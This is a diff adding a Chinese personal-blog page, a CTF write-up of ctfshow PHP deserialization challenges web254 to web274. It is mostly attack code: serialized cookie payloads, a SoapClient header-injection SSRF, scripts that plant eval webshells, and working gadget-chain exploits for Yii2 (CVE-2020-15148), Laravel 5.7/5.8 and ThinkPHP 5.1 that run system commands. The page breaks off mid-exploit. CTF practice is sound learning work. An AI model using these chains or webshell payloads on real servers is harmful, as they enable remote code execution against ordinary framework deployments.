@@ -1,0 +1,1072 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN ">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoylindo || PHP反序列化_WP</title>
+    <meta name="author" content="hoylindo">
+    <meta name="description" content="嗨，这里是一个搭建的不太熟练的小破站 ">
+    <meta name="keywords" content=" ">
+    <link rel="icon" href="/1.jpg">
+    <link rel="stylesheet" href="/css/antd.min.css">
+    
+    <link rel="stylesheet" href="/css/maiden-theme.css">
+    
+    <script src="/js/vue.js"></script>
+    <script src="/js/antd.min.js"></script>
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+
+    <div id="loading"
+        style="height: 100vh; width: 100%; position: fixed;display: flex;z-index: 200; justify-content: space-between;">
+        <div id="loadleft" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div id="loadright" style="width: 50%;background-color: #ffffff;transition: width 0.6s ease-out;"></div>
+        <div
+            style="position: fixed; height: 100vh; width: 100%;display: flex;justify-content: center;align-items: center;">
+            <div id="loadcontent"
+                style="width:400px;height:400px;padding:50px;border-radius:50%;display:flex;justify-content:center;align-items:center;border:solid 10px#fba3cf; text-align:center;opacity:1;transition:opacity 0.3s ease-out;">
+                <div>
+                    <h2>LOADING...</h2>
+                    <p>dadada~</p>
+                    <div>
+                        <img src="/dancingkitty.gif" alt="loading">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="layout">
+        <transition name="into">
+            <div v-show="show_page" style="display: none;">
+                <div id="menu_show">
+                     
+<nav id="menu">
+    <div class="desktop-menu">
+        <a href="/">
+            <span class="title">Hoylindo</span>
+        </a>
+        
+        <a href="/">
+            <span>
+                <a-icon type="home" theme="filled" />
+            </span>
+            <span>home</span>
+        </a>
+        
+        <a href="/about">
+            <span>
+                <a-icon type="idcard" theme="filled" />
+            </span>
+            <span>about</span>
+        </a>
+        
+        <a href="/archives">
+            <span>
+                <a-icon type="folder" theme="filled" />
+            </span>
+            <span>archives</span>
+        </a>
+        
+        <a href="/categories">
+            <span>
+                <a-icon type="book" theme="filled" />
+            </span>
+            <span>categories</span>
+        </a>
+        
+        <a href="/tags">
+            <span>
+                <a-icon type="tags" theme="filled" />
+            </span>
+            <span>tags</span>
+        </a>
+        
+    </div>
+
+    <div :class="'phone-menu ' + menu_show" id="phone-menu">
+        <div :class="'title'" @click="menu_show=!menu_show">
+            <span style="margin-right: 10px;">
+                <a-icon type="appstore" theme="filled" />
+            </span>
+            <span>Hoylindo</span>
+        </div>
+        <div class="items" v-show="menu_show">
+            
+            <a href="/">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="home" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">home</div>
+                </div>
+            </a>
+            
+            <a href="/about">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="idcard" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">about</div>
+                </div>
+            </a>
+            
+            <a href="/archives">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="folder" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">archives</div>
+                </div>
+            </a>
+            
+            <a href="/categories">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="book" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">categories</div>
+                </div>
+            </a>
+            
+            <a href="/tags">
+                <div class="item">
+                    <div style="min-width:20px; max-width:50px; width: 10%">
+                        <a-icon type="tags" theme="filled" />
+                    </div>
+                    <div style="min-width:100px;max-width: 150%;width: 20%;">tags</div>
+                </div>
+            </a>
+            
+        </div>
+        <div class="curtain" v-show="menu_show"></div>
+    </div>
+
+</nav>
+                </div>
+
+                <div id="main">
+                     
+<link rel="stylesheet" href="/css/post-body.css">
+<div class="article">
+    <div>
+        <h1>PHP反序列化_WP </h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <a-icon type="calendar" theme="filled" />
+            </span>
+            2022/9/28
+        </span>
+
+        
+        <span class="category">
+            <a href="/categories/关于web安全">
+                <span class="icon">
+                    <a-icon type="book" theme="filled" />
+                </span>
+                关于web安全
+            </a>
+        </span>
+        
+
+        
+
+        <span class="tags">
+            <span class="icon">
+                <a-icon type="tags" theme="filled" />
+            </span>
+            
+            <span class="tag">
+                
+                <a href="/tags/PHP" style=color:#879cff>
+                    PHP
+                </a>
+            </span>
+            
+        </span>
+        
+    </div>
+
+    <div class="content" v-pre>
+        <br>
+
+<span id="more"></span>
+
+<p>不知道为啥这个格式乱了好多，鼓捣半天</p>
+<h2 id="CTFSHOW-php反序列化"><a href="#CTFSHOW-php反序列化" class="headerlink" title="CTFSHOW-php反序列化"></a>CTFSHOW-php反序列化</h2><h3 id="web254-传参"><a href="#web254-传参" class="headerlink" title="web254-传参"></a>web254-传参</h3><blockquote>
+<ul>
+<li>看了半天怎么反序列化结果发现这题不考反序列化</li>
+<li>直接传参：<code>?username=xxxxxx&amp;password=xxxxxx</code></li>
+</ul>
+</blockquote>
+<h3 id="web255-反序列化"><a href="#web255-反序列化" class="headerlink" title="web255-反序列化"></a>web255-反序列化</h3><blockquote>
+<ul>
+<li>基础的反序列化，首先要求传入username和password，然后cookie传入一个user进行反序列化</li>
+<li>然后依次调用类中的三个方法，序列化时应将isvip设置为true，并进行url编码</li>
+<li>payload：<ul>
+<li>（get）<code>?username=xxxxxx&amp;password=xxxxxx</code></li>
+<li>（cookie）<code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A8%3A%22password%22%3Bs%3A6%3A%22xxxxxx%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="web256-变量覆盖"><a href="#web256-变量覆盖" class="headerlink" title="web256-变量覆盖"></a>web256-变量覆盖</h3><blockquote>
+<ul>
+<li>和255差不多，要求username和password不能相等，把username改为aaa把password改为bbb后序列化</li>
+<li>payload：<ul>
+<li>（get）<code>?username=aaa&amp;password=bbb</code></li>
+<li>（cookie）<code>user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A3%3A%22aaa%22%3Bs%3A8%3A%22password%22%3Bs%3A3%3A%22bbb%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="web257-pop"><a href="#web257-pop" class="headerlink" title="web257-pop"></a>web257-pop</h3><blockquote>
+<ul>
+<li><p>可以看到backDoor类和info类中存在同名函数，利用同名函数构造pop链：</p>
+<pre><code class="php">&lt;?php
+    class ctfShowUser&#123;
+        private $username=&#39;xxxxxx&#39;;
+        private $password=&#39;xxxxxx&#39;;
+        private $isVip=false;
+        private $class = &#39;info&#39;;
+
+        public function __construct()&#123;
+            $this-&gt;class=new backDoor();
+        &#125;
+        public function login($u,$p)&#123;
+            return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+        &#125;
+        public function __destruct()&#123;
+            $this-&gt;class-&gt;getInfo();
+        &#125;
+
+    &#125;
+    class backDoor&#123;
+        private $code = &#39;system(&quot;ls&quot;);&#39;;  //执行后换成system(&quot;cat flag.php&quot;)
+        public function getInfo()&#123;
+            eval($this-&gt;code);
+        &#125;
+    &#125;
+
+    echo urlencode(serialize(new ctfShowUser()));
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web258-绕过正则"><a href="#web258-绕过正则" class="headerlink" title="web258-绕过正则"></a>web258-绕过正则</h3><blockquote>
+<ul>
+<li><p>这个故事告诉我们不能偷懒，妄图直接拿上一个题的脚本加两个<code>str_replace</code>，结果成员变量给换成pubic的了，死死活活出不来</p>
+</li>
+<li><p><code>/[oc]:\d+:/i</code>可以通过在数字前加<code>+</code>绕过</p>
+<pre><code class="php">&lt;?php
+    class ctfShowUser&#123;
+        public $username=&#39;xxxxxx&#39;;
+        public $password=&#39;xxxxxx&#39;;
+        public $isVip=false;
+        public $class = &#39;info&#39;;
+
+        public function __construct()&#123;
+            $this-&gt;class=new backDoor();
+        &#125;
+        public function login($u,$p)&#123;
+            return $this-&gt;username===$u&amp;&amp;$this-&gt;password===$p;
+        &#125;
+        public function __destruct()&#123;
+            $this-&gt;class-&gt;getInfo();
+        &#125;
+
+    &#125;
+    class backDoor&#123;
+        public $code = &#39;system(&quot;ls&quot;);&#39;;  //执行后换成system(&quot;cat flag.php&quot;)
+        public function getInfo()&#123;
+            eval($this-&gt;code);
+        &#125;
+    &#125;
+    $t = str_replace(&quot;:11&quot;,&quot;:+11&quot;,serialize(new  ctfShowUser()));
+    $t = str_replace(&quot;:8&quot;,&quot;:+8&quot;,$t);
+    echo urlencode($t);
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web259-SoapClient类"><a href="#web259-SoapClient类" class="headerlink" title="web259-SoapClient类"></a>web259-SoapClient类</h3><blockquote>
+<ul>
+<li><p>提示：</p>
+<pre><code class="php">flag.php
+
+$xff = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
+array_pop($xff);
+$ip = array_pop($xff);
+if($ip!==&#39;127.0.0.1&#39;)&#123;
+      die(&#39;error&#39;);
+  &#125;else&#123;
+      $token = $_POST[&#39;token&#39;];
+      if($token==&#39;ctfshow&#39;)&#123;
+          file_put_contents(&#39;flag.txt&#39;,$flag);
+      &#125;
+  &#125;
+</code></pre>
+<ul>
+<li>可以猜到考的是SoapClient类的利用</li>
+</ul>
+</li>
+<li><p>在PHP 中使用<code>$_SERVER[&quot;REMOTE_ADDR&quot;]</code>来取得客户端的 IP地址，但如果客户端是使用代理服务器来访问，那取到的就是代理服务器的 IP 地址，而不是真正的客户端 IP 地址；要想透过代理服务器取得客户端的真实 IP 地址，就要使用<code>$_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]</code>来读取</p>
+</li>
+<li><p>X-Forwarded-For 是一个 HTTP 扩展头部；HTTP/1.1（RFC 2616）协议并没有对它的定义，它最开始是由 Squid 这个缓存代理软件引入，用来表示 HTTP 请求端真实 IP （HTTP学成**了</p>
+</li>
+<li><p>如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：</p>
+<pre><code class="http">X-Forwarded-For: IP0, IP1, IP2
+</code></pre>
+</li>
+<li><p>Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求；列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得</p>
+</li>
+<li><p>那么我们就可以构造序列化内容：</p>
+<pre><code class="php">&lt;?php
+    $ua = &quot;ctfshow\r\nx-forwarded-for:127.0.0.1,127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-         urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;
+    $client = new SoapClient(null, array(&#39;uri&#39; =&gt; &#39;http://127.0.0.1&#39;, &#39;location&#39; =&gt; &#39;http://127.0.0.1/flag.php&#39;, &#39;user_agent&#39; =&gt; $ua));
+    $t = serialize($client);
+    echo urlencode($t);
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web260-正则"><a href="#web260-正则" class="headerlink" title="web260-正则"></a>web260-正则</h3><blockquote>
+<ul>
+<li>两个做法：<ul>
+<li>一个是字符串逃逸的原理：直接在序列化内容后加<code>ctfshow_i_love_36D</code></li>
+<li>一个是成员变量赋值为<code>ctfshow_i_love_36D</code></li>
+</ul>
+</li>
+</ul>
+</blockquote>
+<h3 id="web261-弱比较-绕过-wakeup"><a href="#web261-弱比较-绕过-wakeup" class="headerlink" title="web261-弱比较+绕过__wakeup"></a>web261-弱比较+绕过__wakeup</h3><blockquote>
+<ul>
+<li><p>在php7.4.0开始，如果类中同时定义了 <code>__unserialize()</code> 和 <code>__wakeup()</code> 两个魔术方法，则只有 <code>__unserialize()</code> 方法会生效，<code>__wakeup()</code> 方法会被忽略</p>
+</li>
+<li><p><code>__unserialize()</code> 方法让序列化后的$code等于username和password拼接的值，弱比较判断code是否等于0x36d-&gt;877</p>
+</li>
+<li><p>序列化脚本：</p>
+<pre><code class="php">&lt;?php
+    class ctfshowvip&#123;
+        public $username;
+        public $password;
+        public $code;
+
+        public function __construct($u,$p)&#123;
+            $this-&gt;username=$u;
+            $this-&gt;password=$p;
+        &#125;
+        public function __unserialize($data)&#123;
+            $this-&gt;username=$data[&#39;username&#39;];
+            $this-&gt;password=$data[&#39;password&#39;];
+            $this-&gt;code = $this-&gt;username.$this-&gt;password;
+        &#125;
+
+    echo urlencode(serialize(new ctfshowvip(&#39;877.php&#39;,&#39;&lt;?php eval(@$_POST[1]);&#39;)));
+</code></pre>
+</li>
+<li><p>访问877.php，命令执行得到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web262-字符串逃逸-变长"><a href="#web262-字符串逃逸-变长" class="headerlink" title="web262-字符串逃逸-变长"></a>web262-字符串逃逸-变长</h3><blockquote>
+<ul>
+<li><p>好了，今天智商持续掉线，有人连flag在哪个页面输出都不知道了</p>
+</li>
+<li><p>可以看到注释里有一个massage.php，内容表达了如果反序列化后的token=admin，就会输出flag</p>
+</li>
+<li><p>字符串替换：<code>$umsg = str_replace(&#39;fuck&#39;, &#39;loveU&#39;, serialize($msg));</code></p>
+</li>
+<li><p>直接C++构造超长的由54个<code>fuck</code>构成的字符串，payload：</p>
+<pre><code class="txt">f=fuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuckfuck&quot;;s:3:&quot;msg&quot;;i:2;s:2:&quot;to&quot;;i:3;s:5:&quot;token&quot;;s:5:&quot;admin&quot;;&#125;&amp;t=1&amp;m=1
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<h3 id="web263-session反序列化"><a href="#web263-session反序列化" class="headerlink" title="web263-session反序列化"></a>web263-session反序列化</h3><blockquote>
+<ul>
+<li><p>卡住了，不知道为啥马写不进去</p>
+</li>
+<li><p>在经历了123456789….次尝试后，终于成功了</p>
+</li>
+<li><p>给了个登录页面，<a href="http://www.zip下载源码，index.php中：`$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);`，可知session可控">www.zip下载源码，index.php中：`$_SESSION[&#39;limit&#39;]=base64_decode($_COOKIE[&#39;limit&#39;]);`，可知session可控</a></p>
+</li>
+<li><p>在inc/inc.php中，存在<code>__destruct</code>方法，可以写文件</p>
+<pre><code class="php">&lt;?php
+    class User&#123;
+        public $username=&#39;1.php&#39;;
+        public $password=&#39;&lt;?php @eval($_POST[1]); ?&gt;&#39;;
+    &#125;
+    echo base64_encode(&#39;|&#39;.serialize(new User()));
+</code></pre>
+</li>
+<li><p>请求一次index.php，写入序列化字符串，请求check.php，执行反序列化，访问long-1.php，写马成功</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web264-字符串逃逸-session"><a href="#web264-字符串逃逸-session" class="headerlink" title="web264-字符串逃逸+session"></a>web264-字符串逃逸+session</h3><blockquote>
+<ul>
+<li>按理来说应该和262差不多的，但是还是出不来</li>
+<li>太感动了呜呜呜，我看看是谁不会设置cookie：<code>Cookie: PHPSESSID=vg227j3holoo5t07g0apqoc372； msg=1</code></li>
+<li>就比262多了一个给Cookie[‘msg’]赋值，卡了好久好久…可见上一题也是在这里摔倒了</li>
+</ul>
+</blockquote>
+<h3 id="web265-引用"><a href="#web265-引用" class="headerlink" title="web265-引用"></a>web265-引用</h3><blockquote>
+<ul>
+<li><p>另token等于一个随机数：<code>$ctfshow-&gt;token=md5(mt_rand());</code>，但要求password和token相等，可以使用引用：</p>
+<pre><code class="php">&lt;?php
+    class ctfshowAdmin&#123;
+        public $token;
+        public $password;
+
+        public function login()&#123;
+            return $this-&gt;token===$this-&gt;password;
+        &#125;
+    &#125;
+    $t = new ctfshowAdmin();
+    $t-&gt;password=&amp;$t-&gt;token;
+    echo urlencode(serialize($t));
+</code></pre>
+</li>
+<li><p>get传参得到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web266-快速析构"><a href="#web266-快速析构" class="headerlink" title="web266-快速析构"></a>web266-快速析构</h3><blockquote>
+<ul>
+<li>又是新东西捏</li>
+<li>destruct会在脚本结束后执行，而抛出异常导致无法立即执行destruct，所以要进行快速析构</li>
+<li>当php接收到畸形序列化字符串时，PHP由于其容错机制，依然可以反序列化成功；但是，由于给的是一个畸形的序列化字符串，总之他是不标准的，所以PHP对这个畸形序列化字符串得到的对象不放心，于是PHP就要赶紧把它清理掉，那么就触发了他的析构方法</li>
+<li>方法：改掉属性的个数，删掉结尾的<code>&#125;</code></li>
+<li>在PHP中，类不区分大小写，所以可以改为<code>CTFshow</code>也可以绕过</li>
+</ul>
+</blockquote>
+<h3 id="web267-Yii框架"><a href="#web267-Yii框架" class="headerlink" title="web267-Yii框架"></a>web267-Yii框架</h3><blockquote>
+<ul>
+<li><p>打开是一个ctfshow社区页面，扫目录页没扫到啥</p>
+</li>
+<li><p>弱口令<code>admin admin</code>成功登录，可以在about页面源码里找到<code>view-source</code>，<code>?r=site%2Fabout&amp;view-source</code>可以看到：</p>
+<pre><code class="php">///backdoor/shell
+unserialize(base64_decode($_GET[&#39;code&#39;]))
+</code></pre>
+</li>
+<li><p>搜了一下说是利用Yii框架，<code>Yii2 2.0.38</code>之前的版本存在反序列化漏洞，程序在调用unserialize 时，可通过构造特定的恶意请求执行任意命令；CVE编号是CVE-2020-15148</p>
+</li>
+<li><p>有现成的exp可以直接rce：</p>
+<pre><code class="php">&lt;?php
+namespace yii\rest&#123;
+    class CreateAction&#123;
+        public $checkAccess;
+        public $id;
+
+        public function __construct()&#123;
+            $this-&gt;checkAccess = &#39;passthru&#39;;  //函数
+            $this-&gt;id = &#39;tac /flag&#39;;  //参数
+        &#125;
+    &#125;
+&#125;
+namespace Faker&#123;
+    use yii\rest\CreateAction;
+
+    class Generator&#123;
+        protected $formatters;
+
+        public function __construct()&#123;
+            $this-&gt;formatters[&#39;close&#39;] = [new CreateAction(), &#39;run&#39;];
+        &#125;
+    &#125;
+&#125; 
+namespace yii\db&#123;
+    use Faker\Generator;
+
+    class BatchQueryResult&#123;
+        private $_dataReader;
+
+        public function __construct()&#123;
+            $this-&gt;_dataReader = new Generator;
+        &#125;
+    &#125;
+&#125;
+namespace&#123;
+    echo base64_encode(serialize(new yii\db\BatchQueryResult));
+&#125;
+</code></pre>
+</li>
+<li><p><strong>passthru函数：</strong>是用来执行外部命令的，当所执行的 Unix 命令输出二进制数据， 并且需要直接传送到浏览器的时候， 需要用此函数来替代 exec() 或 system() 函数</p>
+</li>
+<li><p>传参：<code>?r=/backdoor/shell&amp;code=[序列化内容]</code></p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web268-Yii框架-1"><a href="#web268-Yii框架-1" class="headerlink" title="web268-Yii框架+1"></a>web268-Yii框架+1</h3><blockquote>
+<ul>
+<li><p>和267步骤一样，但是267的exp用不了了，呜呜呜</p>
+</li>
+<li><p>新的exp：</p>
+<pre><code class="php">&lt;?php
+    namespace yii\rest&#123;
+        class IndexAction&#123;
+            public $checkAccess;
+            public $id;
+            public function __construct() &#123;
+                $this-&gt;checkAccess = &#39;exec&#39;;
+                $this-&gt;id = &#39;cp /f* 1.txt&#39;;
+            &#125;
+        &#125;
+    &#125;
+    namespace Faker &#123;
+        use yii\rest\IndexAction;
+        class Generator&#123;
+            protected $formatters;
+            public function __construct() &#123;
+                $this-&gt;formatters[&#39;isRunning&#39;] = [new IndexAction(), &#39;run&#39;]; 
+            &#125;
+        &#125;
+    &#125;
+    namespace Codeception\Extension&#123;
+        use Faker\Generator;
+        class RunProcess &#123;
+            private $processes = [];
+            public function __construct()&#123;
+                $this-&gt;processes[]=new Generator();
+            &#125;
+        &#125;
+    &#125;
+    namespace&#123;        
+        use Codeception\Extension\RunProcess;
+        echo base64_encode(serialize(new RunProcess()));
+    &#125;
+</code></pre>
+</li>
+<li><p>然后访问1.txt，可以看到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web269-Yii框架-1-1"><a href="#web269-Yii框架-1-1" class="headerlink" title="web269-Yii框架+1+1"></a>web269-Yii框架+1+1</h3><blockquote>
+<ul>
+<li><p>新新新新exp：</p>
+<pre><code class="php">&lt;?php
+    namespace yii\rest&#123;
+        class CreateAction&#123;
+            public $checkAccess;
+            public $id;
+
+            public function __construct()&#123;
+                $this-&gt;checkAccess = &#39;exec&#39;;
+                $this-&gt;id = &#39;cp /f* 1.txt&#39;;
+            &#125;
+        &#125;
+    &#125;
+    namespace Faker&#123;
+        use yii\rest\CreateAction;
+        class Generator&#123;
+            protected $formatters;
+            public function __construct()&#123;
+                $this-&gt;formatters[&#39;render&#39;] = [new CreateAction(), &#39;run&#39;];
+            &#125;
+        &#125;
+    &#125;
+    namespace phpDocumentor\Reflection\DocBlock\Tags&#123;
+        use Faker\Generator;
+        class See&#123;
+            protected $description;
+            public function __construct() &#123;
+                $this-&gt;description = new Generator();
+            &#125;
+        &#125;
+    &#125;
+    namespace&#123;
+        use phpDocumentor\Reflection\DocBlock\Tags\See;
+        class Swift_KeyCache_DiskKeyCache&#123;
+            private $keys = [];
+            private $path;
+            public function __construct() &#123;
+                $this-&gt;path = new See;
+                $this-&gt;keys = array(
+                    &quot;tingshuo&quot;=&gt;array(&quot;zheli&quot;=&gt;&quot;suibianxie&quot;)
+                );
+            &#125;
+        &#125;
+        // 生成poc
+        echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));
+    &#125;
+</code></pre>
+</li>
+<li><p>访问1.txt，得到flag</p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web270-Yii框架-1-1-1"><a href="#web270-Yii框架-1-1-1" class="headerlink" title="web270-Yii框架+1+1+1"></a>web270-Yii框架+1+1+1</h3><blockquote>
+<ul>
+<li><p>又双叒叕是一个新的exp</p>
+<pre><code class="php">&lt;?php
+    namespace yii\rest &#123;
+        class Action
+        &#123;
+            public $checkAccess;
+        &#125;
+        class IndexAction
+        &#123;
+            public function __construct($func, $param)
+            &#123;
+                $this-&gt;checkAccess = $func;
+                $this-&gt;id = $param;
+            &#125;
+        &#125;
+    &#125;
+    namespace yii\web &#123;
+        abstract class MultiFieldSession
+        &#123;
+            public $writeCallback;
+        &#125;
+        class DbSession extends MultiFieldSession
+        &#123;
+            public function __construct($func, $param)
+          &#123;
+                $this-&gt;writeCallback = [new \yii\rest\IndexAction($func, $param), &quot;run&quot;];
+            &#125;
+        &#125;
+    &#125;
+    namespace yii\db &#123;
+        use yii\base\BaseObject;
+        class BatchQueryResult
+        &#123;
+            private $_dataReader;
+            public function __construct($func, $param)
+            &#123;
+                $this-&gt;_dataReader = new \yii\web\DbSession($func, $param);
+            &#125;
+        &#125;
+    &#125;
+    namespace &#123;
+        $exp = new \yii\db\BatchQueryResult(&#39;exec&#39;, &#39;cp /f* 1.txt&#39;);
+        echo(base64_encode(serialize($exp)));
+    &#125;
+</code></pre>
+</li>
+</ul>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU5MDI0ODI5MQ==&mid=2247485129&idx=1&sn=b27e3fe845daee2fb13bb9f36f53ab40">我是怎么挖掘yii2反序列化0day的 (qq.com)</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/cosmoslin/article/details/120612714">yii反序列化漏洞复现及利用_Snakin_ya的博客-CSDN博客_yii反序列化漏洞</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/lr147258/p/15353622.html">yii漏洞复现以及对yii相关的ctf题分析 - 哎呀我去， - 博客园 (cnblogs.com)</a></p>
+<hr>
+<h3 id="web271-Laravel5-7"><a href="#web271-Laravel5-7" class="headerlink" title="web271-Laravel5.7"></a>web271-Laravel5.7</h3><blockquote>
+<ul>
+<li><p>先是搜到了这个是什么框架，然后去找了了个利用的但是用不了</p>
+</li>
+<li><p>呜呜呜，面向wp学ctf</p>
+</li>
+<li><p>还有就是post参数用hackbar不行，但是bp就可以，害的我耽误好久呜呜</p>
+<pre><code class="php">&lt;?php
+    namespace Illuminate\Foundation\Testing &#123;
+        class PendingCommand &#123;
+            public $test;
+            protected $app;
+            protected $command;
+            protected $parameters;
+
+            public function __construct($test, $app, $command, $parameters) &#123;
+                $this-&gt;test = $test;                 //一个实例化的类 Illuminate\Auth\GenericUser
+                $this-&gt;app = $app;                   //一个实例化的类 Illuminate\Foundation\Application
+                $this-&gt;command = $command;           //要执行的php函数 system
+                $this-&gt;parameters = $parameters;     //要执行的php函数的参数  array(&#39;id&#39;)
+            &#125;
+        &#125;
+    &#125;
+    namespace Faker &#123;
+        class DefaultGenerator&#123;
+            protected $default;
+            public function __construct($default = null) &#123;
+                $this-&gt;default = $default;
+            &#125;
+        &#125;
+    &#125;
+    namespace Illuminate\Foundation &#123;
+        class Application&#123;
+            protected $instances = [];
+            public function __construct($instances = []) &#123;
+                $this-&gt;instances[&#39;Illuminate\Contracts\Console\Kernel&#39;] = $instances;
+            &#125;
+        &#125;
+    &#125;
+    namespace &#123;
+        $defaultgenerator = new Faker\DefaultGenerator(array(&quot;hello&quot; =&gt; &quot;world&quot;));
+        $app = new Illuminate\Foundation\Application();
+        $application = new Illuminate\Foundation\Application($app);
+        $pendingcommand = new Illuminate\Foundation\Testing\PendingCommand($defaultgenerator, $application, &#39;system&#39;, array(&#39;cat /flag&#39;));
+        echo urlencode(serialize($pendingcommand));
+    &#125;
+</code></pre>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113826483">laravel5.7 反序列化漏洞复现</a></p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web272-Laravel5-8"><a href="#web272-Laravel5-8" class="headerlink" title="web272-Laravel5.8"></a>web272-Laravel5.8</h3><blockquote>
+<ul>
+<li><p>还是框架漏洞（感觉这些框架的复现是个大工程啊，exp：</p>
+</li>
+<li><pre><code class="php">&lt;?php
+    namespace PhpParser\Node\Scalar\MagicConst&#123;
+        class Line &#123;&#125;
+    &#125;
+    namespace Mockery\Generator&#123;
+        class MockDefinition &#123;
+            protected $config;
+            protected $code;
+            public function __construct($config, $code) &#123;
+                $this-&gt;config = $config;
+                $this-&gt;code = $code;
+            &#125;
+        &#125;
+    &#125;
+    namespace Mockery\Loader&#123;
+        class EvalLoader&#123;&#125;
+    &#125;
+    namespace Illuminate\Bus&#123;
+        class Dispatcher &#123;
+            protected $queueResolver;
+            public function __construct($queueResolver) &#123;
+                $this-&gt;queueResolver = $queueResolver;
+            &#125;
+        &#125;
+    &#125;
+    namespace Illuminate\Foundation\Console&#123;
+        class QueuedCommand &#123;
+            public $connection;
+            public function __construct($connection) &#123;
+                $this-&gt;connection = $connection;
+            &#125;
+        &#125;
+    &#125;
+    namespace Illuminate\Broadcasting&#123;
+        class PendingBroadcast &#123;
+            protected $events;
+            protected $event;
+            public function __construct($events, $event) &#123;
+                $this-&gt;events = $events;
+                $this-&gt;event = $event;
+            &#125;
+        &#125;
+    &#125;
+    namespace&#123;
+        $line = new PhpParser\Node\Scalar\MagicConst\Line();
+        $mockdefinition = new Mockery\Generator\MockDefinition($line,&quot;&lt;?php system(&#39;cat /f*&#39;);exit;?&gt;&quot;);
+        $evalloader = new Mockery\Loader\EvalLoader();
+        $dispatcher = new Illuminate\Bus\Dispatcher(array($evalloader,&#39;load&#39;));
+        $queuedcommand = new Illuminate\Foundation\Console\QueuedCommand($mockdefinition);
+        $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
+        echo urlencode(serialize($pendingbroadcast));
+    &#125;
+</code></pre>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5911">Laravel5.8.x反序列化POP链 </a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/113835057">laravel5.8 反序列化漏洞复现</a></p>
+</li>
+</ul>
+</blockquote>
+<h3 id="web273-Larvel5-8"><a href="#web273-Larvel5-8" class="headerlink" title="web273-Larvel5.8"></a>web273-Larvel5.8</h3><blockquote>
+<ul>
+<li>和272一模一样，直接用272的payload就可以</li>
+<li>据说是php版本不一样了</li>
+</ul>
+</blockquote>
+<h3 id="web274-thinkphp5-1"><a href="#web274-thinkphp5-1" class="headerlink" title="web274-thinkphp5.1"></a>web274-thinkphp5.1</h3><blockquote>
+<ul>
+<li><p>看源码找到：<code>@unserialize(base64_decode(\$_GET[&#39;data&#39;]))</code></p>
+</li>
+<li><p>exp：</p>
+<pre><code class="php">&lt;?php
+    namespace think;
+    abstract class Model&#123;
+        protected $append = [];
+        private $data = [];
+        function __construct() &#123;
+            $this-&gt;append = [&quot;la&quot;=&gt;[&quot;ls /&quot;,&quot;calc&quot;]];  //注意看这里
+            $this-&gt;data = [&quot;la&quot;=&gt;new Request()];
+        &#125;
+    &#125;
+    class Request &#123;
+        protected $hook = [];
+        protected $filter = &quot;system&quot;;
+        protected $config = [
+// 表单请求类型伪装变量  
+            &#39;var_method&#39;       =&gt; &#39;_method&#39;,  
